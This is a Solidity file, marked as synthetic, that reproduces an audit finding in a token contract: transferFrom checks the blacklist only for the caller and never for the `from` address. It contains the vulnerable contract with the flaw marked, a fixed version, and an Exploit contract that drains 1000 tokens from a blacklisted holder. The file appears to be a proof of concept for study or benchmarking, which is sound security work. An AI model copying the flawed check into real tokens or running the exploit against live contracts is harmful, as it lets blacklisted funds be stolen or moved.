// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Terplayer beraBTC — transferFrom checks only msg.sender against the
    blacklist (Shieldify, April 2025, H-01). SYNTHETIC, cheatcode-free.
    The modifier and transferFrom are the blamed lines (@> VULN).

    A holder who approved a spender before being blacklisted can still move
    tokens: transferFrom reverts only when the caller is blacklisted, not
    when `from` is. 1000 tokens move to the spender. The fixed transferFrom
    also rejects a blacklisted `from`, and the 1000 stay. */

contract BeraBitcoin {
    mapping(address => bool) public isBlacklisted;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    error AccountIsBlacklisted();

    modifier notBlacklisted() {
        // @> VULN: only the caller is checked. transferFrom never looks at `from`.
        if (isBlacklisted[msg.sender]) revert AccountIsBlacklisted();
        _;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function setBlacklist(address account, bool banned) external {
        isBlacklisted[account] = banned;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public notBlacklisted returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual notBlacklisted returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BeraBitcoinFixed is BeraBitcoin {
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (isBlacklisted[from] || isBlacklisted[msg.sender]) revert AccountIsBlacklisted();
        return super.transferFrom(from, to, amount);
    }
}

contract Holder {
    function approve(BeraBitcoin token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function send(BeraBitcoin token, address to, uint256 amount) external returns (bool ok) {
        try token.transfer(to, amount) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;

    BeraBitcoin public token; // nonce 1
    Holder public holder; // nonce 2
    bool public directMoved;
    uint256 public stolen;

    constructor() {
        token = new BeraBitcoin();
        holder = new Holder();
    }

    function run() external {
        token.mint(address(holder), AMOUNT);
        holder.approve(token, address(this), AMOUNT);
        token.setBlacklist(address(holder), true);
        directMoved = holder.send(token, msg.sender, AMOUNT);
        token.transferFrom(address(holder), msg.sender, AMOUNT);
        stolen = token.balanceOf(msg.sender);
        require(directMoved == false, "direct transfer should revert");
        require(token.balanceOf(address(holder)) == 0, "holder still has tokens");
        require(stolen == AMOUNT, "spender did not receive 1000");
        require(token.isBlacklisted(address(holder)), "holder not blacklisted");
    }
}
